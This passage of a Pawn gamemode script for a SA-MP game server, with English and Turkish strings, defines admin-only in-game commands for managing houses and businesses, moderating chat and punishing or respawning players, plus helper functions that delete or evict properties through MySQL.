	if ((BusID < 0) || (BusID >= MAX_BUSINESS)) return SendClientMessage(playerid, 0xFF0000AA, "You need to enter a valid BusID");

	// Check if the business exists (it must have a valid pickup)
	if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
	{
		// Port the player to the given location
		SetPlayerPos(playerid, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]);

		// Let the player know he ported to the given business
		format(Msg, 128, "{00FF00}You ported to business with ID: {FFFF00}%i", BusID);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	}
	else
		SendClientMessage(playerid, 0xFF0000AA, "That business doesn't exist");

	// Let the server know that this was a valid command
	return 1;
}


/*
// This command lets the player see all other properties of the same player
CMD:aevler(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/aevler", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 5 && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /properties when you're inside a vehicle");

	// Setup local variables
	new Name[24], DialogTitle[128];

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
			{
			    // Check if this house is owned
			    if (AHouseData[HouseID][Owned] == true)
			    {
					// Store the ownername
					format(Name, 24, AHouseData[HouseID][Owner]);

					// End the search
					break;
				}
			}
		}
	}

	// In case no house was found in range (Name is empty), try to find a business
	if (Name[0] == 0)
	{
		// Loop through all businesses
		for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
		{
			// Check if the business exists (it must have a valid pickup)
			if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
			{
				// Check if the player is in range of the house-pickup
				if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
				{
				    // Check if this business is owned
				    if (ABusinessData[BusID][Owned] == true)
					{
						// Store the ownername
						format(Name, 24, ABusinessData[BusID][Owner]);

						// End the search
						break;
					}
				}
			}
		}
	}

	// Check if a name has been found
	if (Name[0] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No owned house or business found in range");

	// Clear the array
	for (new i; i < sizeof(PropertyList); i++)
	    PropertyList[i] = 0;

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
		    // Check if this house is owned
		    if (AHouseData[HouseID][Owned] == true)
		    {
				// Check if the owner-name is the same
				if (strcmp(AHouseData[HouseID][Owner], Name, false) == 0)
				{
					// Add the property to the list
					format(PropertyList, sizeof(PropertyList), "%sHouse %i: %s\n", PropertyList, HouseID, AHouseData[HouseID][HouseName]);
				}
			}
		}
	}
	// Loop through all businesses
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if the business exists (it must have a valid pickup)
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
		    // Check if this business is owned
		    if (ABusinessData[BusID][Owned] == true)
			{
				// Check if the owner-name is the same
				if (strcmp(ABusinessData[BusID][Owner], Name, false) == 0)
				{
					// Add the property to the list
					format(PropertyList, sizeof(PropertyList), "%sBusiness %i: %s\n", PropertyList, BusID, ABusinessData[BusID][BusinessName]);
				}
			}
		}
	}

	// Setup the dialog title
	format(DialogTitle, 128, "Properties of \"%s\"", Name);

	// List all properties in a dialog
	ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_LIST, DialogTitle, PropertyList, "OK", "Cancel");

	// Let the server know that this was a valid command
	return 1;
}
*/


// This command lets the player ID a house or business
CMD:propertyid(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/propertyid", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 5 && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /propertyid when you're inside a vehicle");

	// Setup local variables
	new Msg[128];

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
			{
				// Let the player know the HouseID of this house
				format(Msg, 128, "{00FF00}This house has ID: {FFFF00}%i", HouseID);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);

				// Exit the function
				return 1;
			}
		}
	}

	// In case no house was found in range, try to find a business

	// Loop through all businesses
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if the business exists (it must have a valid pickup)
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
			{
				// Let the player know the BusinessID of this business
				format(Msg, 128, "{00FF00}This business has ID: {FFFF00}%i", BusID);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);

				// Exit the function
				return 1;
			}
		}
	}

	// There was no house or business in range, so let the player know about it
	SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No house or business in range to ID");

	// Let the server know that this was a valid command
	return 1;
}



// This command lets the player delete a house or business
CMD:mulksil(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/mulksil", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 6 && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /mulksil when you're inside a vehicle");

	// Setup local variables
	new Msg[128];

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
			{
				// Delete the house, inform the owner if he's online and remove the house from the owner's account
				House_Delete(HouseID);

				// Also let the player know he deleted the house
				format(Msg, 128, "{00FF00}You have deleted the house with ID: {FFFF00}%i", HouseID);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);

				// Exit the function
				return 1;
			}
		}
	}

	// In case no house was found in range, try to find a business to delete

	// Loop through all businesses
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if the business exists (it must have a valid pickup)
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
			{
				// Delete the business, inform the owner if he's online and remove the business from the owner's account
				Business_Delete(BusID);

				// Also let the player know he deleted the business
				format(Msg, 128, "{00FF00}You have deleted the business with ID: {FFFF00}%i", BusID);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);

				// Exit the function
				return 1;
			}
		}
	}

	// There was no house or business in range, so let the player know about it
	SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No house or business in range to delete");

	// Let the server know that this was a valid command
	return 1;
}

CMD:modifiye(playerid, params[])
{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SelectTextDraw(playerid,0x708090FF);
			for(new i = 0; i < sizeof(wTuning1);i++)
			{
			TextDrawShowForPlayer(playerid, wTuning1[i]);
			}
			//SendClientMessage(playerid, C_AVISO, "{FF0000}[BILGI] {FFFFFF}Modifiye Sistemini Kullaniyorsunuz ,{00FF00} -10.000$");
			//RewardPlayer(playerid,-10000,0);
			modcmd[playerid] = 1;
		}
		else
		{
			SendClientMessage(playerid, C_AVISO, "{FFCC00}» {FFFFFF}Bir Aracýn Ýcinde Degilsiniz.");
		}
	return 1;
}

CMD:chatengelle(playerid,params[])
{
	SendAdminText(playerid, "/chatengelle", params);

	if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
	{
		if(ServerAyarlari[ChatEngel] == 0)
		{
	    	ServerAyarlari[ChatEngel] = 1;
			new Engelledin[255];
			format(Engelledin,sizeof(Engelledin),"ADMIN %s Tarafýndan Chat Engellendi",GetName(playerid));
	    	SendClientMessageToAll(-1,Engelledin);
	    }
	    else
  		{
  		    new Engellemedin[255];
			format(Engellemedin,sizeof(Engellemedin),"ADMIN %s Tarafýndan Chat Engeli Kaldýrýldý.",GetName(playerid));
	    	SendClientMessageToAll(-1,Engellemedin);
  			ServerAyarlari[ChatEngel] = 0;
  		}
	}
return 1;
}
/*yak oni
CMD:chatengelle(playerid,params[])
{
	SendAdminText(playerid, "/burn", params);

	if (APlayerData[playerid][PlayerLevel] == 5 || Root[playerid] == 1)
	{

	}
*/

CMD:dorseget(playerid, params[])
{
	// Setup local variables
	new gid;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/dorseget", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", gid)) SendSyntaxMessage(playerid, "/dorseget <Dorse ID>");
			else
			{
					new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z);
					//ACGETCALL
					SetVehiclePos(gid,x+3,y,z);
					SetVehicleVirtualWorld(gid,GetPlayerVirtualWorld(playerid));
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:vuroni(playerid, params[])
{
	// Setup local variables
	new OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/vuroni", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/vuroni <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					SetPlayerHealth(OtherPlayer,0.0);
					new BilgiY[254];
					format(BilgiY,sizeof(BilgiY),"{FF0000} ADMIN {FFFFFF} %s {FF0000} Tarafýndan '' Öldürüldünüz'' ",GetName(playerid));
				 	SendClientMessage(OtherPlayer,-1,BilgiY);

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:silahizni(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Bilgia[254];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/silahizni", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/silahizni <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				if(SilahIzni[OtherPlayer] == 0)
				{
					SilahIzni[OtherPlayer] = 1;
					SendClientMessage(playerid,-1,"{FF0000} Secilen Oyuncuya Silah Ýzni Verildi ");
					format(Bilgia,sizeof(Bilgia),"{FF0000} ADMIN {FFFFFF} %s {FF0000} Tarafýndan Size ' Silah Ýzni ' Verildi ",GetName(playerid));
				 	SendClientMessage(OtherPlayer,-1,Bilgia);
			 	}else{
			 		SilahIzni[OtherPlayer] = 0;
					SendClientMessage(playerid,-1,"{FF0000} Secilen Oyuncudan Silah Ýzni Geri Alindi ");
					format(Bilgia,sizeof(Bilgia),"{FF0000} ADMIN {FFFFFF} %s {FF0000} Tarafýndan Sizin ' Silah Ýzni ' Geri Alindi ",GetName(playerid));
				 	SendClientMessage(OtherPlayer,-1,Bilgia);
			 	}

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:yak(playerid, params[])
{
	// Setup local variables
	new OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/yak", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/yak <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					new Float:x, Float:y, Float:z;
					GetPlayerPos(OtherPlayer, x, y, z);
					CreateExplosion(x, y , z + 3, 1, 10);
					new Bilgis[254];
					format(Bilgis,sizeof(Bilgis),"{FF0000} ADMIN {FFFFFF} %s {FF0000} Tarafýndan ' Yakýldýnýz' ",GetName(playerid));
				 	SendClientMessage(OtherPlayer,-1,Bilgis);

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:fu(playerid, params[])
{
	// Setup local variables
	new OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fu", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/fu <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					SetPlayerHealth(OtherPlayer,1.0);
					SetPlayerArmour(OtherPlayer,0.0);
					ResetPlayerWeapons(OtherPlayer);
					//ResetPlayerMoney(OtherPlayer);
					SilahVer(OtherPlayer,12,1);
					SetPlayerSkin(OtherPlayer, 137);
					//SetPlayerScore(OtherPlayer, 0);
					SetPlayerWeather(OtherPlayer,19);
					APlayerData[OtherPlayer][PlayerWanted] = 6;

					new Bilgir[254];
					format(Bilgir,sizeof(Bilgir),"{FF0000} ADMIN {FFFFFF} %s {FF0000} Tarafýndan ' FU**' Komutuna Maruz Kaldiniz. ",GetName(playerid));
				 	SendClientMessage(OtherPlayer,-1,Bilgir);

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:asilah(playerid,params[])
{
	SendAdminText(playerid, "/asilah", params);

	if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
	{
	    SilahIzni[playerid] = 1;
		for(new i=0;i <= 38;i++)
 		{
	 				SilahVer(playerid,i,100);
 		}
	}
	// Let the server know that this was a valid command
	return 1;
}


CMD:spawnall(playerid,params[])
{
	SendAdminText(playerid, "/spawnall", params);

	if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
	    SpawnPlayer(i);
 		}
	}
	// Let the server know that this was a valid command
	return 1;
}


CMD:afpolis(playerid,params[])
{
	SendAdminText(playerid, "/afpolis", params);

	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
	    APlayerData[i][PlayerClass] = ClassPolice;
	    SpawnPlayer(i);
 		}
 		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Herkezi POLIS Yapti");
	}
	// Let the server know that this was a valid command
	return 1;
}

CMD:aftirci(playerid,params[])
{
	SendAdminText(playerid, "/aftirci", params);

	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
 		APlayerData[i][PlayerClass] = ClassTruckDriver;
     	SpawnPlayer(i);
 		}
 		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Herkezi TIRCI Yapti");
	}
	// Let the server know that this was a valid command
	return 1;
}


CMD:ejectall(playerid,params[])
{
	SendAdminText(playerid, "/ejectall", params);

	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		new Float:X,Float:Y,Float:Z;
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
			if(IsPlayerInAnyVehicle(i))
			{
			PlayerPlaySound(i,1057,0.0,0.0,0.0); GetPlayerPos(i,X,Y,Z);
			SetPlayerPos(i,X,Y,Z+3);
			}
 		}
 		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Herkezi Araclardan Atti");
	}
	// Let the server know that this was a valid command
	return 1;
}






CMD:gpcall(playerid,params[])
{
	SendAdminText(playerid, "/gpcall", params);

	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
			if(IsPlayerConnected(i))
			{
  			new Car, Float:X,Float:Y,Float:Z,Float:Angle;
		    GetPlayerPos(i,X,Y,Z);
	    	GetPlayerFacingAngle(i,Angle);
      		Car = Vehicle_Create(596,X,Y,Z,Angle,1,-1,-1);
        	PutPlayerInVehicle(i,Car,0);
        	}
 		}
 		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Herkeze Polis Araci Verdi");
	}
	// Let the server know that this was a valid command
	return 1;
}



CMD:unfreezeall(playerid,params[])
{
	SendAdminText(playerid, "/unfreezeall", params);

	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
		TogglePlayerControllable(i,true);
 		}
 		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Hareket Etme Engelini Kaldirdi");
	}
	// Let the server know that this was a valid command
	return 1;
}


CMD:freezeall(playerid,params[])
{
	SendAdminText(playerid, "/freezeall", params);

	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
		for(new i=0;i < MAX_PLAYERS;i++)
 		{
		TogglePlayerControllable(i,false);
 		}
		SendClientMessageToAll(-1,"{FF0000}YETKILI ADMIN - Hareket Etme Engelini Aktif Etti");
	}
	// Let the server know that this was a valid command
	return 1;
}



CMD:bac(playerid,params[])
{
	SendAdminText(playerid, "bakim var dedim dedim inanmadiniz bak ne oldu simdi ?", params);

	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
	bakimvar = 1;
	}
	// Let the server know that this was a valid command
	return 1;
}


CMD:bkapat(playerid,params[])
{
	SendAdminText(playerid, "bizim mezar tasýna yazmislar bakim yok", params);

	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
	bakimvar = 0;
	}
	// Let the server know that this was a valid command
	return 1;
}




// This command lets the player evict a house or business (remove ownership of the house or business to make it available for sale again)
CMD:evict(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/evict", params);

	// Exit the command if the player hasn't logged in using his password
	if (APlayerData[playerid][LoggedIn] == false) return 0;
	// Exit the command if the player has an admin-level lower than 5
	if (APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	// Exit the command if the player is inside a vehicle
	if (GetPlayerVehicleSeat(playerid) != -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /evict when you're inside a vehicle");

	// Setup local variables
	new Msg[128];

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
			{
				// Check if the house is owned
				if (AHouseData[HouseID][Owned] == true)
				{
					// Evict the house, inform the owner if he's online and remove the house from the owner's account
					House_Evict(HouseID);

					// Also let the player know he evicted the house
					format(Msg, 128, "{FFFF00}%i {00FF00}ID'li eve el koyuldu.", HouseID);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);

					// Exit the function
					return 1;
				}
				else
					return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu evin sahibi yok ve el koyulamaz.");
			}
		}
	}

	// In case no house was found in range, try to find a business to delete
	new query[256], bSahipli, Cache: get_isyeri, rows;

	// Loop through all businesses
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if the business exists (it must have a valid pickup)
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
			// Check if the player is in range of the house-pickup
			if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
			{
				mysql_format(Connection, query, sizeof(query), "SELECT Sahipli FROM isyerleri WHERE ID = '%d'", BusID);
				get_isyeri = mysql_query(Connection, query);
				rows = cache_num_rows();

				if(rows)
				{
					for(new i; i < rows; ++i)
					{
						cache_get_value_name_int(i, "Sahipli", bSahipli);
     				}
				}

				cache_delete(get_isyeri);

				// Check if the business is owned
				if (bSahipli == 1)
				{
					// Evict the business, inform the owner if he's online and remove the business from the owner's account
					Business_Evict(BusID);

					// Also let the player know he evicted the business
					format(Msg, 128, "{FFFF00}%i {00FF00}ID'li iþyerine el koyuldu", BusID);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);

					// Exit the function
					return 1;
				}
				else
					return SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}This business has no owner and cannot be evicted");
			}
		}
	}

	// There was no house or business in range, so let the player know about it
	SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No house or business in range to evict");

	// Let the server know that this was a valid command
	return 1;
}



// This function will delete the given house from the server and from the owner's account (if it has an owner)
House_Delete(HouseID)
{
	// Setup local variables
	new file[100], Msg[128], Name[24]/*, bool:PlayerOnline = false*/;

	// Check if the house is owned
	if (AHouseData[HouseID][Owned] == true)
	{
		// Loop through all players to find the owner (if he's online)
		for (new pid; pid < MAX_PLAYERS; pid++)
		{
			// Check if this player is online
		    if (IsPlayerConnected(pid))
		    {
		        // Get that player's name
		        GetPlayerName(pid, Name, sizeof(Name));
		        // Compare if this player has the same name as the owner of the house
				if (strcmp(AHouseData[HouseID][Owner], Name, false) == 0)
				{
				    // Set PlayerOnline to "true"
				    /*PlayerOnline = true;*/

					// Inform the player that his house is being deleted
					format(Msg, 128, "{FF0000}Your house {FFFF00}\"%s\"{FF0000} is being deleted", AHouseData[HouseID][HouseName]);
					SendClientMessage(pid, 0xFFFFFFFF, Msg);

					// Also remove the HouseID from his list of houses
					/*for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
					    // Check if the house is stored in this houseslot
					    if (APlayerData[pid][Houses][HouseSlot] == HouseID)
					        // If the house is stored in this slot, clear the slot
					        APlayerData[pid][Houses][HouseSlot] = 0;*/

					// Save the player's account again
					Oyuncu_Kaydet(pid);

					// Stop this For-loop, as the owner was already found and informed
					break;
				}
		    }
		}

		// Check if the player was not online
		/*if (PlayerOnline == false)
			// Remove the house from the player's account (open the account, remove the data and re-save it)
			PlayerFile_RemoveProperty(AHouseData[HouseID][Owner], HouseID, 0);*/
	}

	// First remove all vehicles from the house
	House_RemoveVehicles(HouseID);

	// Clear all data of the house
	AHouseData[HouseID][HouseName] = 0;
	AHouseData[HouseID][Insurance] = 0;
	AHouseData[HouseID][HouseX] = 0.0;
	AHouseData[HouseID][HouseY] = 0.0;
	AHouseData[HouseID][HouseZ] = 0.0;
	AHouseData[HouseID][HouseLevel] = 0;
	AHouseData[HouseID][HouseMaxLevel] = 0;
	AHouseData[HouseID][HousePrice] = 0;
	AHouseData[HouseID][Owned] = false;
	AHouseData[HouseID][Owner] = 0;
	// Destroy the mapicon, 3DText and pickup for the house
	DestroyDynamicPickup(AHouseData[HouseID][PickupID]);
	DestroyDynamicMapIcon(AHouseData[HouseID][MapIconID]);
	DestroyDynamic3DTextLabel(AHouseData[HouseID][DoorText]);
	AHouseData[HouseID][PickupID] = 0;
	AHouseData[HouseID][MapIconID] = 0;

	// Delete the House-file
	format(file, sizeof(file), HouseFile, HouseID); // Construct the complete filename for this house-file
	if (fexist(file)) // Make sure the file exists
		fremove(file); // Delete the file
}

// This function will evict the given house from the server and from the owner's account (if it has an owner)
House_Evict(HouseID)
{
	// Setup local variables
	new Msg[128], Name[24]/*, bool:PlayerOnline = false*/;

	// Check if the house is owned
	if (AHouseData[HouseID][Owned] == true)
	{
		// Loop through all players to find the owner (if he's online)
		for (new pid; pid < MAX_PLAYERS; pid++)
		{
			// Check if this player is online
		    if (IsPlayerConnected(pid))
		    {
		        // Get that player's name
		        GetPlayerName(pid, Name, sizeof(Name));
		        // Compare if this player has the same name as the owner of the house
				if (strcmp(AHouseData[HouseID][Owner], Name, false) == 0)
				{
				    // Set PlayerOnline to "true"
				    /*PlayerOnline = true;*/

					// Inform the player that his house is being deleted
					format(Msg, 128, "{FF0000}Eviniz olan {FFFF00}\"%s\"{FF0000}a el koyuldu.", AHouseData[HouseID][HouseName]);
					SendClientMessage(pid, 0xFFFFFFFF, Msg);

					// Also remove the HouseID from his list of houses
					/*for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
					    // Check if the house is stored in this houseslot
					    if (APlayerData[pid][Houses][HouseSlot] == HouseID)
					        // If the house is stored in this slot, clear the slot
					        APlayerData[pid][Houses][HouseSlot] = 0;*/

					// Save the player's account again
					Oyuncu_Kaydet(pid);

					// Stop this For-loop, as the owner was already found and informed
					break;
				}
		    }
		}

		// Check if the player was not online
		/*if (PlayerOnline == false)
			// Remove the house from the player's account (open the account, remove the data and re-save it)
			PlayerFile_RemoveProperty(AHouseData[HouseID][Owner], HouseID, 0);*/
	}

	// First remove all vehicles from the house
	House_RemoveVehicles(HouseID);

	// Clear ownership of the house
	AHouseData[HouseID][Owned] = false;
	AHouseData[HouseID][Owner] = 0;

	// Update the entrance of the house
	House_UpdateEntrance(HouseID);

	// Save the housefile
	HouseFile_Save(HouseID);
}

// This function will delete the given business from the server and from the owner's account (if it has an owner)
Business_Delete(BusID)
{
	// Setup local variables
	new /*file[100],*/ Msg[128], Name[24]/*, bool:PlayerOnline = false*/;

	new query[256], bName[100], bSahipli, bSahip[40], Cache: get_isyeri, rows;
	mysql_format(Connection, query, sizeof(query), "SELECT Isim,Sahipli,Sahip FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
		{
			cache_get_value_name(i, "Isim", bName);
			cache_get_value_name_int(i, "Sahipli", bSahipli);
			cache_get_value_name(i, "Sahip", bSahip);
		}
	}

	cache_delete(get_isyeri);

	// Check if the business is owned
	if (bSahipli == 1)
	{
		// Loop through all players to find the owner (if he's online)
		for (new pid; pid < MAX_PLAYERS; pid++)
		{
			// Check if this player is online
		    if (IsPlayerConnected(pid))
		    {
		        // Get that player's name
		        GetPlayerName(pid, Name, sizeof(Name));
		        // Compare if this player has the same name as the owner of the business
				if (strcmp(bSahip, Name, false) == 0)
				{
				    // Set PlayerOnline to "true"
				    /*PlayerOnline = true;*/

					// Inform the player that his business is being deleted
					format(Msg, 128, "{FF0000}BILGI :  {FFFF00}\"%s\"{FF0000} isimli iþyeriniz silinmistir.", bName);
					SendClientMessage(pid, 0xFFFFFFFF, Msg);

					// Also remove the BusID from his list of businesses
					/*for (new BusSlot; BusSlot < MAX_BUSINESSPERPLAYER; BusSlot++)
					    // Check if the business is stored in this business-slot
					    if (APlayerData[pid][Business][BusSlot] == BusID)
					        // If the business is stored in this slot, clear the slot
					        APlayerData[pid][Business][BusSlot] = 0;*/

					// Save the player's account again
					Oyuncu_Kaydet(pid);

					// Stop this For-loop, as the owner was already found and informed
					break;
				}
		    }
		}

		// Check if the player was not online
		/*if (PlayerOnline == false)
			// Remove the house from the player's account (open the account, remove the data and re-save it)
			PlayerFile_RemoveProperty(ABusinessData[BusID][Owner], 0, BusID);*/
	}

	// Clear all data of the business
	//ABusinessData[BusID][BusinessName] = 0;
	ABusinessData[BusID][BusinessX] = 0.0;
	ABusinessData[BusID][BusinessY] = 0.0;
	ABusinessData[BusID][BusinessZ] = 0.0;
